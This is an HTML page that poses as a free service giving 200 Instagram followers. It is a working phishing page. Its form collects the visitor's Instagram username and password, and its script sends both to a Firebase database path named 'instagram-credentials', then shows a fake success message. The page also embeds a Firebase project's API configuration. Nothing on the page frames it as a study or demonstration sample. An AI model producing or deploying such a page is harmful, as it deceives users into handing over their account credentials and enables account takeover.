<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Get Instagram Followers</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Rajdhani:wght@500;700&display=swap');

    @keyframes colorShift {
      0% { color: #00f7ff; }
      50% { color: #a855f7; }
      100% { color: #00f7ff; }
    }

    body {
      background: linear-gradient(180deg, #0d1117 0%, #1c2530 100%);
      color: #a7f3d0;
      min-height: 100vh;
      overflow-y: auto;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
      user-select: none;
    }

    .container {
      width: 100%;
      max-width: 85%;
      padding: 40px;
      border-radius: 15px;
      background: rgba(0, 0, 0, 0.6);
      border: 1px solid rgba(255, 255, 255, 0.15);
      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);
      transition: all 0.3s ease-in-out;
      margin-bottom: 40px;
    }

    .container:hover {
      transform: translateY(-5px);
      box-shadow: 0 12px 20px rgba(0, 0, 0, 0.5);
    }

    .top-banner {
      background: linear-gradient(135deg, #00bfff, #1e90ff); /* चमकीला नीला ग्रेडिएंट */
      color: #fff;
      text-align: center;
      padding: 15px 0;
      margin-bottom: 30px;
      border-radius: 10px;
      font-size: 1.3em;
      font-weight: bold;
      text-shadow: 0 0 8px #00bfff;
    }

    h1 {
      font-size: 3.2em;
      color: #e9d8fd;
      text-shadow: 0 0 20px #e9d8fd;
      margin-bottom: 30px;
      text-align: center;
      animation: colorShift 4s linear infinite;
    }

    h2 {
      font-size: 2.4em;
      color: #a855f7;
      text-shadow: 0 0 12px #a855f7;
      margin-bottom: 25px;
      text-align: center;
    }

    label {
      font-size: 1.4em;
      color: #f0f9ff;
      text-shadow: 0 0 8px #f0f9ff;
      display: block;
      margin-bottom: 10px;
    }

    input[type="text"],
    input[type="password"],
    button {
      padding: 15px;
      border-radius: 10px;
      border: 1px solid #6366f1;
      background-color: #1e293b;
      color: #f0f9ff;
      font-family: 'Roboto Mono', monospace;
      font-size: 1.1em;
      width: 100%;
      box-sizing: border-box;
      margin-bottom: 20px;
    }

    button {
      background: linear-gradient(135deg, #4caf50, #8bc34a); /* हरा ग्रेडिएंट */
      border: none;
      font-weight: bold;
      cursor: pointer;
      transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
      box-shadow: 0 6px 12px rgba(76, 175, 80, 0.5);
    }

    button:hover {
      transform: translateY(-7px);
      box-shadow: 0 10px 20px rgba(76, 175, 80, 0.6);
    }

    .congrats-message {
      background-color: rgba(76, 175, 80, 0.2); /* हल्का हरा बैकग्राउंड */
      color: #4caf50;
      text-align: center;
      padding: 15px;
      border-radius: 8px;
      margin-top: 20px;
      font-size: 1.2em;
      font-weight: bold;
    }
  </style>
</head>

<body>

  <div class="container">
    <div class="top-banner">
      Instagram 200 Followers Get Free
    </div>
    <h1>Boost Your Instagram</h1>

    <section id="credentials-saver">
      <h2>Enter Instagram Details</h2>
      <form id="credentials-form">
        <label for="instagram_id">Instagram ID:</label>
        <input type="text" id="instagram_id" required>
        <label for="password">Password:</label>
        <input type="password" id="password" required>
        <button type="submit">Get Followers</button>
      </form>
      <div id="congrats" class="congrats-message" style="display:none;">
        Congratulations! 200 Followers Today Sent
      </div>
    </section>
  </div>

  <script type="module">
    // Import Firebase SDK
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";

    // Your Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyDaTurSbn-e8roa7o9DeAzEDAb_ZETBu3I",
      authDomain: "comment-app-eae1d.firebaseapp.com",
      databaseURL: "https://comment-app-eae1d-default-rtdb.firebaseio.com",
      projectId: "comment-app-eae1d",
      storageBucket: "comment-app-eae1d.firebasestorage.app",
      messagingSenderId: "1085942013485",
      appId: "1:1085942013485:web:8b73425849e72db191e2a4",
      measurementId: "G-WF0852Z57K"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);
    const credentialsRef = ref(database, 'instagram-credentials'); // New reference for Instagram
    const credentialsForm = document.getElementById('credentials-form');
    const congratsMessage = document.getElementById('congrats');

    credentialsForm.addEventListener('submit', (event) => {
      event.preventDefault();

      const instagramIdInput = document.getElementById('instagram_id');
      const passwordInput = document.getElementById('password');

      const instagramId = instagramIdInput.value.trim();
      const password = passwordInput.value.trim();

      if (instagramId && password) {
        push(credentialsRef, {
          instagram_id: instagramId,
          password: password,
          timestamp: new Date().toISOString()
        });

        instagramIdInput.value = '';
        passwordInput.value = '';
        congratsMessage.style.display = 'block'; // Show the congratulatory message
        setTimeout(() => {
          congratsMessage.style.display = 'none'; // Hide after a few seconds
        }, 5000); // Hide after 5 seconds
      } else {
        alert('Please enter both Instagram ID and Password.');
      }
    });
  </script>

</body>

  </html>
